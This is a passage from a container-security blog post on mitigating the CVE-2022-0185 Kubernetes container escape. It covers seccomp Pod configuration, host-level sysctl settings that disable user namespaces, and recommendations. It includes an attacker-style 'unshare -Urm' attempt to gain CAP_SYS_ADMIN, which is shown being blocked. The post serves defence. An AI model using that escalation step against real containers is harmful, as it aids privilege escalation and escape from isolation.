</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-yaml" data-lang="yaml"><span class="c"># pod-test.yaml</span><span class="w">
</span><span class="w"></span><span class="nt">apiVersion</span><span class="p">:</span><span class="w"> </span><span class="l">v1</span><span class="w">
</span><span class="w"></span><span class="nt">kind</span><span class="p">:</span><span class="w"> </span><span class="l">Pod</span><span class="w">
</span><span class="w"></span><span class="nt">metadata</span><span class="p">:</span><span class="w">
</span><span class="w">  </span><span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l">protected</span><span class="w">
</span><span class="w"></span><span class="nt">spec</span><span class="p">:</span><span class="w">
</span><span class="w">  </span><span class="nt">containers</span><span class="p">:</span><span class="w">
</span><span class="w">    </span>- <span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l">protected</span><span class="w">
</span><span class="w">      </span><span class="nt">image</span><span class="p">:</span><span class="w"> </span><span class="l">ubuntu</span><span class="w">
</span><span class="w">      </span><span class="nt">command</span><span class="p">:</span><span class="w">
</span><span class="w">      </span>- <span class="l">sleep</span><span class="w">
</span><span class="w">      </span>- <span class="l">infinity</span><span class="w">
</span><span class="w">      </span><span class="nt">securityContext</span><span class="p">:</span><span class="w">
</span><span class="w">        </span><span class="nt">seccompProfile</span><span class="p">:</span><span class="w">
</span><span class="w">          </span><span class="nt">type</span><span class="p">:</span><span class="w"> </span><span class="l">RuntimeDefault</span><span class="w">
</span></code></pre></td></tr></table>
</div>
</div><p>After creating the Pod, try to use unshare to get CAP_SYS_ADMIN capability.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh">$ kubectl <span class="nb">exec</span> -it protected -- bash
root@protected:/#
root@protected:/# unshare -Urm
unshare: unshare failed: Operation not permitted
</code></pre></td></tr></table>
</div>
</div><p>The output shows that the unshare system call is successfully blocked and the attacker cannot use this capability to attack.</p>
<h3 id="host-level">Host level</h3>
<p>There is another option to disable the ability of user namespace from the host level, without rebooting the system. For example, in Ubuntu, the following two lines are all you need to do to make it work instantly, and it will take effect after a reboot.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh">$ <span class="nb">echo</span> <span class="s2">&#34;kernel.unprivileged_userns_clone=0&#34;</span> &gt; /etc/sysctl.d/userns.conf
$ sysctl -p /etc/sysctl.d/userns.conf
</code></pre></td></tr></table>
</div>
</div><p>If you are on a Red Hat system, you can run the following command to achieve the same result.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh">$ <span class="nb">echo</span> <span class="s2">&#34;user.max_user_namespaces=0&#34;</span> &gt; /etc/sysctl.d/userns.conf
$ sysctl -p /etc/sysctl.d/userns.conf
</code></pre></td></tr></table>
</div>
</div><p>To summarize the recommendations for handling the vulnerability.</p>
<ul>
<li>If your environment can accept patching the kernel and rebooting the system, it is best to patch it, or upgrade the kernel.</li>
<li>Reduce the use of privileged containers that have access to CAP_SYS_ADMIN.</li>
<li>For unprivileged containers, make sure you have a Seccomp filter to block their calls to unshare to reduce risk. no problem with Docker, Kubernetes requires additional action.</li>
<li>In the future, Seccomp profiles can be enabled for all workloads in a Kubernetes cluster. This feature is currently in Alpha and needs to be enabled via a <a href="https://kubernetes.io/docs/tutorials/security/seccomp/#enable-the-use-of-runtimedefault-as-the-default-seccomp-profile-for-all-workloads">feature gate</a>.</li>
<li>The ability to disable user namespace for users at the host level.</li>
</ul>
<h2 id="lastly">Lastly</h2>
<p>Container environments are complex, especially distributed scheduling platforms like Kubernetes, each of which has its own lifecycle and attack surface that can easily expose security risks, and container cluster administrators must pay attention to every detail of security issues. Overall, the security of containers in the vast majority of cases depends on the security of the Linux kernel, so we need to keep an eye on any security issues and implement corresponding solutions as soon as possible.</p>
<h2 id="references">References</h2>
<ul>
<li><a href="https://www.crowdstrike.com/blog/cve-2022-0185-kubernetes-container-escape-using-linux-kernel-exploit/">CVE-2022-0185</a>: Kubernetes Container Escape Using Linux Kernel Exploit</li>
<li><a href="https://sysdig.com/blog/cve-2022-0185-container-escape/">CVE-2022-0185</a>: Detecting and mitigating Linux Kernel vulnerability causing container escape</li>
<li>Excessive <a href="https://0xn3va.gitbook.io/cheat-sheets/container/escaping/excessive-capabilities">Capabilities</a></li>
<li><a href="https://book.hacktricks.xyz/linux-unix/privilege-escalation/linux-capabilities#cap_sys_admin">CAP_SYS_ADMIN</a></li>
</ul>

    </div>

    
<footer class="post-footer">
      <div class="post-tags">
          <a href="/tags/k8s/">k8s</a>
          </div>
      <nav class="post-nav">
        <a class="prev" href="/post/2022-03/bash-select/">
            <i class="iconfont icon-left"></i>
            <span class="prev-text nav-default">Creating menus with Bash Select</span>
            <span class="prev-text nav-mobile">Prev</span>
          </a>
        <a class="next" href="/post/2022-03/jose/">
            <span class="next-text nav-default">Javascript Object Signing and Encryption</span>
            <span class="next-text nav-mobile">Next</span>
            <i class="iconfont icon-right"></i>
          </a>
      </nav>
    </footer>
  </article>
        </div>
        

  

  

      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="social-links">
  <a href="https://www.sobyte.net/index.xml" type="application/rss+xml" class="iconfont icon-rss" title="rss"></a>
</div>

<div class="copyright">
  <span class="power-by">
    Powered by <a class="hexo-link" href="https://gohugo.io">Hugo</a>
  </span>
  <span class="division">|</span>
  <span class="theme-info">
    Theme - 
    <a class="theme-link" href="https://github.com/olOwOlo/hugo-theme-even">Even</a>
  </span>

  

  <span class="copyright-year">
    &copy; 
    2021 - 
    2022<span class="heart"><i class="iconfont icon-heart"></i></span><span></span>
  </span>
</div>

    </footer>

    <div class="back-to-top" id="back-to-top">
      <i class="iconfont icon-up"></i>
    </div>
  </div>
  
  <script src="https://cdn.jsdelivr.net/npm/jquery@3.2.1/dist/jquery.min.js" integrity="sha256-hwg4gsxgFZhOsEEamdOYGBf13FyQuiTwlAQgxVSNgt4=" crossorigin="anonymous"></script>
  <script src="https://cdn.jsdelivr.net/npm/slideout@1.0.1/dist/slideout.min.js" integrity="sha256-t+zJ/g8/KXIJMjSVQdnibt4dlaDxc9zXr/9oNPeWqdg=" crossorigin="anonymous"></script>
  <script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.1.20/dist/jquery.fancybox.min.js" integrity="sha256-XVLffZaxoWfGUEbdzuLi7pwaUJv1cecsQJQqGLe7axY=" crossorigin="anonymous"></script>



<script type="text/javascript" src="/js/main.min.c99b103c33d1539acf3025e1913697534542c4a5aa5af0ccc20475ed2863603b.js"></script>
  <script type="text/javascript">
    window.MathJax = {
      tex: {
        inlineMath: [['$','$'], ['\\(','\\)']],
        tags: 'ams',
        }
    };
  </script>
  <script async src="https://cdn.jsdelivr.net/npm/mathjax@3.0.5/es5/tex-mml-chtml.js" integrity="sha256-HGLuEfFcsUJGhvB8cQ8nr0gai9EucOOaIxFw7qxmd+w=" crossorigin="anonymous"></script>








</body>
</html>
